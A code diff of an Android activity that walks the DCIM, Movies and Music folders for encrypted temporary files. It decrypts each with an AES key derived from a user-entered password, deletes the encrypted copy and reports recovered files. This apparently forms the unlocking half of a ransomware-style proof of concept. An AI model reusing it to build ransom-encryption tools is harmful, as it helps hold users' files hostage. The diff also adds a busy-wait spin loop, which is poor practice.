@@ -7,7 +7,6 @@ import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
-import android.util.Base64;
 import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
@@ -16,17 +15,12 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import com.google.android.gms.common.api.GoogleApiClient;
-
-import org.apache.commons.io.FileUtils;
-
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 
 import br.unb.lasp.Global;
@@ -45,9 +39,6 @@ public class MainActivity extends AppCompatActivity {
     private AutoCompleteTextView mPassTextView;
     private Button mEvaluateButton;
 
-    private String msg = "";
-    private GoogleApiClient client;
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         Log.d(new Object() {
@@ -56,9 +47,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
 
         setContentView(R.layout.activity_main);
-
         mMainView = findViewById(R.id.main_view);
-
         mProgressView = findViewById(R.id.main_progress);
 
         mPassTextView = (AutoCompleteTextView) findViewById(R.id.main_password);
@@ -113,6 +102,9 @@ public class MainActivity extends AppCompatActivity {
             Log.d(new Object() {
             }.getClass().getName(), new Object() {
             }.getClass().getEnclosingMethod().getName());
+            while(Global.STATUS == null || Global.STATUS != Status.FINISHED){
+                continue;
+            }
 
             return true;
         }
@@ -122,6 +114,7 @@ public class MainActivity extends AppCompatActivity {
             Log.d(new Object() {
             }.getClass().getName(), new Object() {
             }.getClass().getEnclosingMethod().getName());
+
             if (success) {
                 mPassTextView.setEnabled(true);
                 mPassTextView.setVisibility(View.VISIBLE);
@@ -133,6 +126,7 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 Toast.makeText(getApplicationContext(), mErrorMsg, Toast.LENGTH_SHORT).show();
             }
+
             showProgress(false);
         }
 
@@ -190,19 +184,19 @@ public class MainActivity extends AppCompatActivity {
         dirList.add(Storage.getDCIMSDir());
         dirList.add(Storage.getMoviesDir());
         dirList.add(Storage.getMusicsDir());
-        List<File> fileList = new ArrayList<>();
+        List<File> tmpFileList = new ArrayList<>();
         for (File dir : dirList) {
             if (dir != null) {
-                fileList.addAll(Storage.listTmpFilesRecursively(dir, new ArrayList<File>()));
+                tmpFileList.addAll(Storage.listTmpFilesRecursively(dir, new ArrayList<File>()));
             }
         }
 
-        for(File file: fileList){
+        for(File tmpFile: tmpFileList){
 
             // get input
             byte[] input = null;
             try {
-                FileInputStream fis = new FileInputStream(file);
+                FileInputStream fis = new FileInputStream(tmpFile);
                 input = new byte[fis.available()];
                 while (fis.read(input) != -1) {
                     // do nothing, just read
@@ -210,22 +204,25 @@ public class MainActivity extends AppCompatActivity {
                 fis.close();
             } catch (FileNotFoundException e) {
                 Log.e(TAG, e.getMessage(), e);
+                continue;
             } catch (IOException e) {
                 Log.e(TAG, e.getMessage(), e);
+                continue;
             } catch (Exception e) {
                 Log.e(TAG, e.getMessage(), e);
+                continue;
             }
 
             // parse
-            byte[] key  = SymmetricAES.getSecretKeySpec(strKey).getEncoded();
-            Log.i(TAG, "Key? " + Arrays.equals(key,Global.key.getEncoded()));
             input = SymmetricAES.decrypt(input, SymmetricAES.getSecretKeySpec(strKey));
-            file.delete();
+            String nFileStr = tmpFile.getPath().substring(0, (tmpFile.getPath().length() - 4 ));
+            tmpFile.delete();
+            File nFile = new File(nFileStr);
 
             // write
             FileOutputStream fos = null;
             try {
-                fos = new FileOutputStream(file);
+                fos = new FileOutputStream(nFile);
                 fos.write(input);
                 fos.flush();
                 fos.close();
@@ -241,21 +238,9 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
 
-            try{
-
-                String nFileStr = file.getPath().substring(0, (file.getPath().length() - 4 ));
-                Log.i(TAG, file.getPath());
-                Log.i(TAG, nFileStr);
-                boolean isEqual = FileUtils.contentEquals(file, new File(nFileStr));
-                Log.i(TAG, "IsEqual? " + isEqual);
-            } catch (IOException e) {
-                Log.e(TAG, e.getMessage(), e);
-            } catch (Exception e) {
-                Log.e(TAG, e.getMessage(), e);
-            }
         }
 
-        Toast.makeText(MainActivity.this, "Recovered Files: " + fileList().length, Toast.LENGTH_SHORT).show();
+        Toast.makeText(MainActivity.this, "Recovered Files: " + tmpFileList.size(), Toast.LENGTH_SHORT).show();
     }
 
 }
